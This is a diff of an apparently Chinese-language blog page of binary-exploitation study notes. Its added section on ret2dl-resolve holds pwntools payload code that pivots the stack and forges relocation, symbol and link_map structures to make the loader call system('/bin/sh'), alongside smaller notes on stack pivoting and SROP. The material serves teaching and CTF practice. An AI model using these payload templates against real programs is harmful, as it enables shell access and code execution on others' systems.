@@ -311,7 +311,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 105 分钟
+                    阅读时长: 108 分钟
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    52424 字
+                    53794 字
                 </time>
             </div>
         
@@ -1317,6 +1317,7 @@
 </span><span class="lnt">94
 </span><span class="lnt">95
 </span><span class="lnt">96
+</span><span class="lnt">97
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="c1">#下断点</span>
@@ -1356,6 +1357,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="c1">#继续 从断点到另一个断点</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">u</span> <span class="mh">0xabc</span> <span class="c1"># 显示汇编码</span>
+</span></span><span class="line"><span class="cl"><span class="n">u</span> <span class="o">&amp;</span><span class="n">func</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">backtrace</span> <span class="c1"># bt显示函数调用关系</span>
 </span></span><span class="line"><span class="cl"><span class="n">k</span> <span class="c1"># 查看函数</span>
@@ -5618,7 +5620,7 @@
 </div>
 </div><h3 id="ret2dl-resolve">ret2dl-resolve</h3>
 <ul>
-<li>不提供 libc</li>
+<li>不提供 libc，且未开启PIE</li>
 </ul>
 <p><strong>相关结构</strong></p>
 <ul>
@@ -5833,7 +5835,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 查找目标符号的地址，并将其填入到GOT表中
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">_dl_fixup</span><span class="p">(</span><span class="n">truct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">_dl_fixup</span><span class="p">(</span><span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// link_map访问.dynamic 获取符号表地址
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="k">const</span> <span class="n">symtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_SYMTAB</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// link_map访问.dynamic 获取字符串表地址
@@ -5914,9 +5916,211 @@
 <img src="/img/pwn_note.zh-cn.assets/image-20241107235715100.png" alt="image-20241107235715100" style="zoom:50%;" />
 <p><strong>利用</strong>：</p>
 <ul>
-<li>控制第二个参数，使其指向伪造的<code>Elf32_Rel</code>，<code>_dl_runtime_resolve</code>函数按下标取值操作未进行越界检查</li>
+<li>plt表调用<code>_dl_runtime_resolve</code>动态链接过程步骤5中：<code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 的arg1 ：<code>link_map_obj</code> push 到栈中，此前的参数为arg2：<code>reloc_offset</code>，需要栈迁移辅助</li>
+<li>ROP接下来伪造控制的是arg2，第二个参数，使其指向伪造的<code>Elf32_Rel</code>，<code>_dl_runtime_resolve</code>函数按下标取值操作未进行越界检查</li>
 <li>若<code>.dynamic</code>不可写，控制第二参数使其访问到可控内存，内存中伪造<code>.rel.plt, .dynsym, .dynstr</code>，调用目标函数</li>
 </ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 先进行栈迁移, 调用read向fake_ebp读入rop数据</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">padding</span> <span class="o">+</span> <span class="n">fake_ebp_addr</span> <span class="o">+</span> <span class="n">read</span><span class="nd">@plt</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_ebp_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用：</p>
+<img src="/img/pwn_note.zh-cn.assets/image-20241110161157056.png" alt="image-20241110161157056" style="zoom: 67%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">func_name</span> <span class="o">=</span> <span class="s2">&#34;system&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">func_args</span> <span class="o">=</span> <span class="s2">&#34;/bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">resolve_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="p">[</span><span class="s1">&#39;sh_addr&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">JMPREL</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_JMPREL&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">SYMTAB</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_SYMTAB&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">STRTAB</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">dynamic_value_by_tag</span><span class="p">(</span><span class="s1">&#39;DT_STRTAB&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_rel_addr</span> <span class="o">=</span> <span class="n">rop_addr</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">reloc_offset</span> <span class="o">=</span> <span class="n">fake_rel_addr</span> <span class="o">-</span> <span class="n">JMPREL</span> <span class="c1"># 伪造参数指向fake Elf_Rel</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">rop_addr</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">align</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">SYMTAB</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xF</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_sym_addr</span> <span class="o">+=</span> <span class="n">align</span> <span class="c1"># 通过r_info指向sym地址, 逆向获取r_info和fake_rel值</span>
+</span></span><span class="line"><span class="cl"><span class="n">r_info</span> <span class="o">=</span> <span class="p">(((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">SYMTAB</span><span class="p">)</span> <span class="o">//</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>  
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x7 means that Assertion `ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_rel</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_name_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="mi">4</span> <span class="c1"># 此处为system字符串位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">st_name</span> <span class="o">=</span> <span class="n">fake_name_addr</span> <span class="o">-</span> <span class="n">STRTAB</span> <span class="c1"># 伪造st_name使其指向system</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_sym</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 最终伪造fake Elf_Sym</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># +3确保地址向上舍入到下一个 4 字节边界, &amp;~3清除值的最低两位, 保证结果为4的倍数</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">rop_addr</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">func_name</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">rop_addr</span> <span class="o">+</span> <span class="n">bin_sh_offset</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># padding填充, 因为之后esp会指向fake_ebp+4</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">resolve_plt</span><span class="p">)</span> <span class="c1"># 实际为_dl_runtime_resolve前一条指令地址</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804c004&gt; 参数1入栈</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># jmp  dword ptr [0x804c008] &lt;_dl_runtime_resolve&gt; 跳转到resolve函数</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">reloc_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 目标函数system的返回地址, 用不到, 填充</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span> <span class="c1"># 目标函数的参数1</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake_rel</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="n">align</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake_sym</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">func_name</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">bin_sh_offset</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">func_args</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>栈迁移read读rop后跳转到<code>leave ret</code>地址，ebp此时指向<code>fake_ebp</code>，执行后esp指向<code>fake_ebp+8</code>，rip指向resolve前一条指令</li>
+<li>push resolve函数的第一个参数，且esp中已伪造第二个参数，跳转执行<code>_dl_runtime_resolve(link_map,reloc_arg)</code></li>
+<li>进入后call执行<code>_dl_fixup</code>函数，最终调用system函数getshell</li>
+</ol>
+<p><strong>64位</strong></p>
+<ul>
+<li>
+<p>选择<code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code>不为0时的流程，此时计算目标函数地址为<code>l-&gt;l_addr+sym-&gt;st_value</code></p>
+</li>
+<li>
+<p>需要知道libc版本，但可在不泄露libc基址情况下利用</p>
+</li>
+<li>
+<p>关键：构造<code>fake_link_map</code></p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">n64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mh">0x10000000000000000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span> 	<span class="c1"># 将负数转换为正数</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map_addr</span> <span class="o">=</span> <span class="mh">0x404000</span> <span class="o">+</span> <span class="mh">0x800</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="n">n64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>  									<span class="c1"># l_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map</span> <span class="o">=</span> <span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">())</span>  								<span class="c1"># l_info[5]需要为可读写的内存, .dynstr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_link_map_addr</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">)</span>  				<span class="c1"># l_info[6] Sym</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map</span> <span class="o">=</span> <span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_link_map_addr</span> <span class="o">+</span> <span class="mh">0x110</span><span class="p">)</span>  				<span class="c1"># l_info[23] Rel</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>  			<span class="c1"># Elf64_Dyn &lt;-5</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - 8 使得前面的st_other大概率为非0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_link_map_addr</span> <span class="o">+</span> <span class="mh">0x120</span><span class="p">)</span>  		<span class="c1"># Elf64_Dyn &lt;-6</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_link_map</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">n64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">-</span> <span class="n">offset</span><span class="p">))</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Elf64_Rel &lt;-23</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="/img/pwn_note.zh-cn.assets/image-20241110201338426.png" alt="image-20241110201338426" style="zoom:67%;" />
+<p>一：先栈溢出构造read函数向link_map地址读入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sh_addr</span> <span class="o">=</span> <span class="n">fake_link_map_addr</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_link_map</span><span class="p">)</span> <span class="c1"># /bin/sh字符串地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">resolve_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">padding</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;ret&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">())</span> <span class="c1"># ebp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdi; ret&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rsi; ret&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_link_map_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">])</span> <span class="c1"># rdx为数量可以直接用地址值</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdi; ret&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">resolve_plt</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="c1"># resolve@plt</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_link_map_addr</span><span class="p">)</span>  	<span class="c1"># arg1: struct link_map *l</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  					<span class="c1"># arg2: ElfW(Word) reloc_arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">payload1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>二：read读入<code>fake_link_map</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">fake_link_map</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ret2vdso">ret2vdso</h3>
 <h2 id="花式栈溢出">花式栈溢出</h2>
 <p>① <strong>无main函数</strong></p>
 <p>用IDA静态分析main的地址，在gdb中打该地址断点</p>
@@ -6010,7 +6214,7 @@
 <blockquote>
 <ol>
 <li>覆盖<strong>ebp</strong>为非法伪造的地址（堆或bss段），覆盖返回地址为<code>pop ebp; ret</code>或 <code>leave; ret</code> 的gadget地址</li>
-<li>执行到<code>leave</code>，即 <code>mov esp, ebp; pop ebp</code> ，先<strong>esp</strong>和<strong>ebp</strong>同时指向覆盖后的ebp位置【vuln ebp】</li>
+<li>执行到<code>leave</code>，即 <code>mov esp, ebp; pop ebp</code> ，ebp值给esp，esp+x，先<strong>esp</strong>和<strong>ebp</strong>同时指向覆盖后的ebp位置【vuln ebp】</li>
 <li>接着【vuln ebp】地址<code>pop</code>给<strong>ebp</strong>，此时<strong>ebp</strong>指向恶意伪造地址</li>
 <li><code>esp＋1</code>后指向返回地址，执行<code>mov esp, ebp</code>，使<strong>esp</strong>和<strong>ebp</strong>同步，栈完成迁移</li>
 <li>新栈中由read提前读入构建好ROP链，即可完成利用</li>
@@ -6293,7 +6497,7 @@
 <li>已知后门函数距起始位置地址0xabcd，则覆盖返回地址时只覆盖最低<strong>2</strong>字节，有<strong>1/16</strong>概率爆破成功</li>
 </ol>
 <h3 id="srop">SROP</h3>
-<p>（Sigreturn Oriented Programming），sigreturn是一个系统调用，在unix系统发生signal时会被间接调用，用户层调用，地址保存在栈上，执行后出栈，用户进程上下文保存在栈上，且内核恢复上下文时不校验</p>
+<p>（Sigreturn Oriented Programming），主要为64位中利用，sigreturn是一个系统调用，在unix系统发生signal时会被间接调用，用户层调用，地址保存在栈上，执行后出栈，用户进程上下文保存在栈上，且内核恢复上下文时不校验</p>
 <ul>
 <li>Linux i386下调用sigreturn的代码存放在vdso中</li>
 <li>Linux x86_64通过调用15号syscall调用sigreturn</li>
@@ -6516,16 +6720,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>覆盖或伪造该结构使得将伪造数据恢复到寄存器中，即控制所有寄存器，rip控制为syscall地址，控制rax利用<code>syscall; ret; </code>可任意系统调用，且需要64位中<code>rax=0xf</code>触发<code>SYS_rt_sigreturn</code>系统调用，32位中为<code>0x77</code></p>
-<p><img src="/img/pwn_note.zh-cn.assets/image-20241024203344880.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20241024203344880"
-	
-	
-></p>
+<img src="/img/pwn_note.zh-cn.assets/image-20241024203344880.png" alt="image-20241024203344880" style="zoom:67%;" />
 <p>使用<strong>pwntools</strong>构造payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -6550,10 +6745,21 @@
 </span></span><span class="line"><span class="cl"><span class="n">signal_frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_addr</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 溢出</span>
